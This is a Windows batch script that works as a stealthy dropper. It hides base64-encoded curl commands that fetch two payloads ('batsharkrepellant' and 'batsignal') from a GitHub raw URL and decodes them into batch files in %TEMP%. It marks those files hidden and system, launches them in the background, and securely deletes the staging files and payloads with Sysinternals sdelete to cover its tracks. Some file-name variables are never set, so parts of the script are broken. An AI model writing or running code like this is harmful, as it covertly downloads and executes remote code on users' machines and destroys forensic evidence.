@echo off

set log=%RANDOM%
set log2=%RANDOM%

IF NOT EXIST %TEMP%\psping64.exe (
	curl https://live.sysinternals.com/psping64.exe --output %TEMP%\psping64.exe
)

IF NOT EXIST %TEMP%\sdelete64.exe (
	curl https://live.sysinternals.com/sdelete64.exe --output %TEMP%\sdelete64.exe
)

if NOT EXIST %TEMP%\accesschk.exe (
	curl https://live.sysinternals.com/accesschk.exe  --output %TEMP%\accesschk.exe
)

 echo Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hyaXN1dTExL0JBVE1BTi9tYWluL2NvZGUvYmF0c2hhcmtyZXBlbGxhbnQK > %TEMP%\%log%
 
 certutil -decode %TEMP%\%log% %TEMP%\%log2%
 set /p command=<%TEMP%\%log2%

 CALL %command% > %TEMP%\%log% 
 certutil -decode %TEMP%\%log% %TEMP%\%batsharkrepellant%.bat

 echo > %TEMP%\%log% | %TEMP%\sdelete64.exe /accepteula -n 5 del %TEMP%\%log%
 echo > %TEMP%\%log2% | %TEMP%\sdelete64.exe /accepteula -n 5 %TEMP%\%log2%  

 echo Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hyaXN1dTExL0JBVE1BTi9tYWluL2NvZGUvYmF0c2lnbmFsCg== > %TEMP%\%log%
 
 certutil -decode %TEMP%\%log% %TEMP%\%log2%
 set /p command=<%TEMP%\%log2%
 
 CALL %command% > %TEMP%\%log% 
 certutil -decode %TEMP%\%log% %TEMP%\%batsignal%.bat

 echo > %TEMP%\%log% | %TEMP%\sdelete64.exe /accepteula -n 5 %TEMP%\%log%
 echo > %TEMP%\%log2% | %TEMP%\sdelete64.exe /accepteula -n 5 %TEMP%\%log2%
 
attrib +h +s %TEMP%\%batsharkrepellant%.bat
attrib +h +s %TEMP%\%batsignal%.bat
start /B %TEMP%\%batsharkrepellant%.bat
start /B %TEMP%\%batsignal%.bat

timeout /t 300 /nobreak > NUL
%TEMP%\sdelete64.exe /accepteula -n 2 %TEMP%\%batsharkrepellant%.bat
%TEMP%\sdelete64.exe /accepteula -n 2 %TEMP%\%batsignal%.bat


